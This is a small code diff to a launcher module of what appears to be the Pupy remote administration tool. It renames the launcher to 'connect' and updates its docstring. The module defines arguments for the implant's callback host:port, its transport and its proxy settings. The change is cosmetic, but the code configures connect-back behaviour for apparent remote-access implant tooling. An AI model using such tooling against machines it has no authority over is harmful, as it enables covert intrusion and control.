@@ -5,9 +5,9 @@
 from ..base_launcher import *
 
 class SimpleLauncher(BaseLauncher):
-	""" simply launch a transport """
+	""" simple launcher that uses TCP connect with a chosen transport """
 	def init_argparse(self):
-		self.arg_parser = LauncherArgumentParser(prog="simple", description=self.__doc__)
+		self.arg_parser = LauncherArgumentParser(prog="connect", description=self.__doc__)
 		self.arg_parser.add_argument('--host', metavar='<host:port>', required=True, help='host:port of the pupy server to connect to')
 		self.arg_parser.add_argument('--transport', choices=[x for x in network.conf.transports.iterkeys()], default="tcp_ssl", help="the transport to use ! (the server needs to be configured with the same transport) ")
 		self.arg_parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex for proxy transports: proxy_addr=192.168.0.1 proxy_port=8080 proxy_type=HTTP")
